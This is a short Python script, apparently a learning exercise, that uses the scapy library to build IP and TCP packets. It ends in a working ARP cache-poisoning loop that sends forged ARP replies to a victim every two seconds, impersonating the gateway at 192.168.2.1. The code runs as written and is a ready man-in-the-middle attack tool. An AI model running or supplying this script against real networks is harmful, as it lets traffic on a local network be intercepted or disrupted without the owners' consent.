from scapy.all import *

# Playing with an IP packet
a = IP()
a.src = "192.168.2.2"
a.dst = "192.168.2.4"
print(a)


# Playing with a TCP packet
b = TCP()
print(b)




#####  Playing with an ARP packet. Trying to poison a specified machine  #####
poisonedTarget = ARP()

# Victim's IP address that we want to poison;
poisonedTarget.pdst = "192.168.2.9"

# Simulate that this is a response packet (who-has(1) / is-at(2));
poisonedTarget.op = 2

# Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
# The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
poisonedTarget.psrc = "192.168.2.1"

# Keep poisoning the ARP;
while True:
    print('Poisoning ' + str(poisonedTarget.pdst))
    send(poisonedTarget, verbose=False)
    time.sleep(2)